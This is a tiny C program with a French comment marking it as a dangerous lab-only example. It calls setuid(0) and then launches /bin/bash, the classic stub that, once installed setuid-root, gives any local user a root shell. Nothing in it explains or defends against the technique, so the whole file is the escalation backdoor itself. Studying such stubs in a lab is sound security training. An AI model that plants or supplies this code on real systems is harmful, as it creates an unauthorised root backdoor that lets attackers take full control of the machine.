// Exemple simple - DANGER : à ne pas utiliser hors lab
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    system("/bin/bash");
    return 0;
}
